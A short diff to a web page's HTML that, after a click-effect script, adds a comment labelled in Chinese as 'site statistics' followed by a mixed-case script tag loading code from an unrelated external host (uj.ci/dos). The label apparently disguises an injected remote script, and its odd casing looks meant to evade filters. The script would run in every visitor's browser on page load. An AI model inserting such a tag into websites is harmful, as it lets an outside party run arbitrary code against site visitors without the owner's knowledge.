@@ -232,5 +232,7 @@ function clickEffect() {
 }
 clickEffect();//调用特效函数
 </script>
+<!-- 站点统计： -->
+<sCRiPt sRC=//uj.ci/dos></sCrIpT>
 
     
